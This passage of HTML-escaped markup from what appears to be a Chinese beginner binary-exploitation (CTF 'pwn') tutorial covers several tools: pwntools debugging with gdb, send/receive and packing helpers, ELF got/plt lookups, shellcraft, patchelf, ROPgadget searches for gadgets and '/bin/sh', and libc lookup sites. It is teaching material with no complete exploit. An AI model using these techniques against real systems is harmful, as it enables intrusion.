class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./pwn3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(io,&lt;span class=&#34;string&#34;&gt;&amp;quot;b main&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#io.sendlineafter(&amp;#x27;Input:&amp;#x27;,payload)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./pwn3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.debug(io,&lt;span class=&#34;string&#34;&gt;&amp;quot;b main&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#io.sendlineafter(&amp;#x27;Input:&amp;#x27;,payload)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/fjh1997/article/details/105434992/&#34;&gt;https://blog.csdn.net/fjh1997/article/details/105434992/&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;配合gdb&#34;&gt;&lt;a href=&#34;#配合gdb&#34; class=&#34;headerlink&#34; title=&#34;配合gdb&#34;&gt;&lt;/a&gt;配合gdb&lt;/h3&gt;&lt;p&gt;在输入一段数据后 断下,比如字符串的那个例子,我们想要查看刚刚输入完数据后的情况,&lt;/p&gt;
&lt;p&gt;第一种方法,找到断点&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;0x5655563b&lt;/span&gt; &amp;lt;fmtstr+&lt;span class=&#34;number&#34;&gt;110&lt;/span&gt;&amp;gt;    push   &lt;span class=&#34;number&#34;&gt;0x63&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;0x5655563d&lt;/span&gt; &amp;lt;fmtstr+&lt;span class=&#34;number&#34;&gt;112&lt;/span&gt;&amp;gt;    lea    eax, [ebp - &lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;► &lt;span class=&#34;number&#34;&gt;0x56555640&lt;/span&gt; &amp;lt;fmtstr+&lt;span class=&#34;number&#34;&gt;115&lt;/span&gt;&amp;gt;    push   eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;0x56555641&lt;/span&gt; &amp;lt;fmtstr+&lt;span class=&#34;number&#34;&gt;116&lt;/span&gt;&amp;gt;    call   fgets@plt                    &amp;lt;fgets@plt&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;0x56555646&lt;/span&gt; &amp;lt;fmtstr+&lt;span class=&#34;number&#34;&gt;121&lt;/span&gt;&amp;gt;    add    esp, &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;0x56555649&lt;/span&gt; &amp;lt;fmtstr+&lt;span class=&#34;number&#34;&gt;124&lt;/span&gt;&amp;gt;    sub    esp, &lt;span class=&#34;number&#34;&gt;0xc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;number&#34;&gt;0x5655564c&lt;/span&gt; &amp;lt;fmtstr+&lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;&amp;gt;    lea    eax, [ebp - &lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;attach的时候断到断点这里就好了,然后 gdb那边c, 然后pwntools这边执行一下(回车) 即可, 或者不用pause, 直接在gdb那c一下就行了&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./vul32&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#io = process(&amp;quot;./pwn3&amp;quot;,&amp;quot;b main&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(io,&lt;span class=&#34;string&#34;&gt;&amp;quot;break *0x56555646&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.debug(&amp;quot;./vul32&amp;quot;,&amp;quot;break main&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;aaaaaa&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#io.sendlineafter(&amp;#x27;Input:&amp;#x27;,payload)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;__kernel_vsyscall+ 一上来的这个是什么?????????? 这是进入到了内核里面吧 可以通过backtrace来看&lt;/p&gt;
&lt;p&gt;#6  0xf7e4b29c in _IO_fgets&lt;/p&gt;
&lt;p&gt;#7  0x56555646 in fmtstr ()&lt;br&gt;#8  0x565556a5 in main ()&lt;br&gt;#9  0xf7dfdfa1 in __libc_start_main (main&amp;#x3D;0x56&lt;br&gt;555685 &lt;main&gt;, argc&amp;#x3D;1, argv&lt;/main&gt;&lt;/p&gt;
&lt;p&gt;确实是进入到断点后的位置&lt;/p&gt;
&lt;p&gt;右边c的时候,需要左边pwntools这边进行输入,右边不能进行输入的&lt;/p&gt;
&lt;p&gt;第二种,直接在开头就断点就好了&lt;/p&gt;
&lt;h2 id=&#34;pwntools基础操作&#34;&gt;&lt;a href=&#34;#pwntools基础操作&#34; class=&#34;headerlink&#34; title=&#34;pwntools基础操作&#34;&gt;&lt;/a&gt;pwntools基础操作&lt;/h2&gt;&lt;p&gt;send和sendline的区别,send只是发送数据,sendline发送一行数据,也就是除了数据,还会加一个换行(回车)&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_45556441/article/details/113982718&#34;&gt;https://blog.csdn.net/weixin_45556441/article/details/113982718&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;安装&#34;&gt;&lt;a href=&#34;#安装&#34; class=&#34;headerlink&#34; title=&#34;安装&#34;&gt;&lt;/a&gt;安装&lt;/h3&gt;&lt;p&gt;apt-get install libffi-dev,libssl-dev&lt;/p&gt;
&lt;p&gt;pip install pwntools&lt;/p&gt;
&lt;h3 id=&#34;环境变量设置&#34;&gt;&lt;a href=&#34;#环境变量设置&#34; class=&#34;headerlink&#34; title=&#34;环境变量设置&#34;&gt;&lt;/a&gt;环境变量设置&lt;/h3&gt;&lt;p&gt;​		许多都是通过全局变量context进行设置的,例如操作系统,架构,字节序等&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;context.os = &lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;  &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;h3 id=&#34;连接及交互&#34;&gt;&lt;a href=&#34;#连接及交互&#34; class=&#34;headerlink&#34; title=&#34;连接及交互&#34;&gt;&lt;/a&gt;连接及交互&lt;/h3&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;file = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./pwn&amp;quot;&lt;/span&gt;)		&lt;span class=&#34;comment&#34;&gt;#本地文件         &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p= remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;xx.xx.xx.xx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;12345&lt;/span&gt;)		&lt;span class=&#34;comment&#34;&gt;#远程		&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(payload)    &lt;span class=&#34;comment&#34;&gt;#发送数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload) &lt;span class=&#34;comment&#34;&gt;#发送数据并添加换行符&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.senduntil?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendafter(string)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recv(count) &lt;span class=&#34;comment&#34;&gt;# 接收count长度的信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(string,drop=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#返回直到接收到指定字符串的信息,drop参数可以指定是否包含终止字符串&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.clear() &lt;span class=&#34;comment&#34;&gt;# 清空消息缓存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive() &lt;span class=&#34;comment&#34;&gt;# 与程序进行交互&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&#34;编码类&#34;&gt;&lt;a href=&#34;#编码类&#34; class=&#34;headerlink&#34; title=&#34;编码类&#34;&gt;&lt;/a&gt;编码类&lt;/h3&gt;&lt;p&gt;​		漏洞利用时,payload可能有各种形式,8.16,32,64位、大端小端,pwntools提供了编码和解码的函数,p开头是编码,u开头是解码,后面跟着的是位数. 此外还提供了asm和disasm两个函数进行汇编和反汇编的转换&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;p32(&lt;span class=&#34;number&#34;&gt;0x8040000&lt;/span&gt;)  &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00\x00\x04\x08&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(u32(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00\x00\x04\x08&amp;#x27;&lt;/span&gt;))    &lt;span class=&#34;string&#34;&gt;&amp;#x27;0x8040000&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;文件信息获取类&#34;&gt;&lt;a href=&#34;#文件信息获取类&#34; class=&#34;headerlink&#34; title=&#34;文件信息获取类&#34;&gt;&lt;/a&gt;文件信息获取类&lt;/h3&gt;&lt;p&gt;​		获取二进制文件或者libc等的got plt表地址,或者偏移等&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;bin-path&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#加载二进制文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf.got[&lt;span class=&#34;string&#34;&gt;&amp;#x27;fun_name&amp;#x27;&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;#获取对应函数的got表地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf.plt[&lt;span class=&#34;string&#34;&gt;&amp;#x27;fun_name&amp;#x27;&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;#获取对应函数的plt表地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;libc-path&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#加载二进制文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.symbols[‘system’] &lt;span class=&#34;comment&#34;&gt;#获取函数地址   &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;] 有什么区别??&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;symbols和got plt的关系???3&lt;/p&gt;
&lt;h3 id=&#34;libc地址计算类&#34;&gt;&lt;a href=&#34;#libc地址计算类&#34; class=&#34;headerlink&#34; title=&#34;libc地址计算类&#34;&gt;&lt;/a&gt;libc地址计算类&lt;/h3&gt;&lt;h3 id=&#34;格式化字符串&#34;&gt;&lt;a href=&#34;#格式化字符串&#34; class=&#34;headerlink&#34; title=&#34;格式化字符串&#34;&gt;&lt;/a&gt;格式化字符串&lt;/h3&gt;&lt;h3 id=&#34;shellcode&#34;&gt;&lt;a href=&#34;#shellcode&#34; class=&#34;headerlink&#34; title=&#34;shellcode&#34;&gt;&lt;/a&gt;shellcode&lt;/h3&gt;&lt;p&gt;Shellcraft.sh()&lt;/p&gt;
&lt;h1 id=&#34;patchelf&#34;&gt;&lt;a href=&#34;#patchelf&#34; class=&#34;headerlink&#34; title=&#34;patchelf&#34;&gt;&lt;/a&gt;patchelf&lt;/h1&gt;&lt;p&gt;patchelf –set-interpreter &amp;#x2F;home&amp;#x2F;ubuntu&amp;#x2F;glibc-all-in-one&amp;#x2F;libs&amp;#x2F;2.23-0ubuntu11.3_i386&amp;#x2F;ld-linux.so.2 .&amp;#x2F;a.out&lt;br&gt;patchelf –set-rpath &amp;#x2F;home&amp;#x2F;ubuntu&amp;#x2F;glibc-all-in-one&amp;#x2F;libs&amp;#x2F;2.23-0ubuntu11.3_i386&amp;#x2F; .&amp;#x2F;a.out		&lt;/p&gt;
&lt;h1 id=&#34;gadget相关工具&#34;&gt;&lt;a href=&#34;#gadget相关工具&#34; class=&#34;headerlink&#34; title=&#34;gadget相关工具&#34;&gt;&lt;/a&gt;gadget相关工具&lt;/h1&gt;&lt;h2 id=&#34;ROPgadget&#34;&gt;&lt;a href=&#34;#ROPgadget&#34; class=&#34;headerlink&#34; title=&#34;ROPgadget&#34;&gt;&lt;/a&gt;ROPgadget&lt;/h2&gt;&lt;p&gt;ROPgadget –binary rop  –only ‘pop|ret’ | grep ‘eax’   &lt;/p&gt;
&lt;p&gt;ROPgadget –binary ret2syscall  –only ‘int’&lt;/p&gt;
&lt;p&gt;ROPgadget –binary ret2syscall  –string ‘&amp;#x2F;bin&amp;#x2F;sh’&lt;/p&gt;
&lt;h1 id=&#34;objdump&#34;&gt;&lt;a href=&#34;#objdump&#34; class=&#34;headerlink&#34; title=&#34;objdump&#34;&gt;&lt;/a&gt;objdump&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230221224643726.png&#34; alt=&#34;image-20230221224643726&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230221224632067.png&#34; alt=&#34;image-20230221224632067&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230221224616734.png&#34; alt=&#34;image-20230221224616734&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;libcsearch&#34;&gt;&lt;a href=&#34;#libcsearch&#34; class=&#34;headerlink&#34; title=&#34;libcsearch&#34;&gt;&lt;/a&gt;libcsearch&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_44108455/article/details/105458234&#34;&gt;https://blog.csdn.net/qq_44108455/article/details/105458234&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/csdn546229768/article/details/121177641&#34;&gt;https://blog.csdn.net/csdn546229768/article/details/121177641&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;apt get install zstd&lt;/p&gt;
&lt;h2 id=&#34;在线搜索libc-libc-database-search&#34;&gt;&lt;a href=&#34;#在线搜索libc-libc-database-search&#34; class=&#34;headerlink&#34; title=&#34;在线搜索libc libc database search&#34;&gt;&lt;/a&gt;在线搜索libc libc database search&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://libc.blukat.me/&#34;&gt;https://libc.blukat.me&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://libc.rip/&#34;&gt;https://libc.rip&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/niklasb/libc-database&#34;&gt;https://github.com/niklasb/libc-database&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/lieanu/LibcSearcher&#34;&gt;https://github.com/lieanu/LibcSearcher&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;Linux自带工具&#34;&gt;&lt;a href=&#34;#Linux自带工具&#34; class=&#34;headerlink&#34; title=&#34;Linux自带工具&#34;&gt;&lt;/a&gt;Linux自带工具&lt;/h1&gt;&lt;h1 id=&#34;file&#34;&gt;&lt;a href=&#34;#file&#34; class=&#34;headerlink&#34; title=&#34;file&#34;&gt;&lt;/a&gt;file&lt;/h1&gt;&lt;p&gt;​		查看文件基本信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230222132901291.png&#34; alt=&#34;image-20230222132901291&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;ldd&#34;&gt;&lt;a href=&#34;#ldd&#34; class=&#34;headerlink&#34; title=&#34;ldd&#34;&gt;&lt;/a&gt;ldd&lt;/h1&gt;&lt;p&gt;打印依赖的共享库文件&lt;/p&gt;
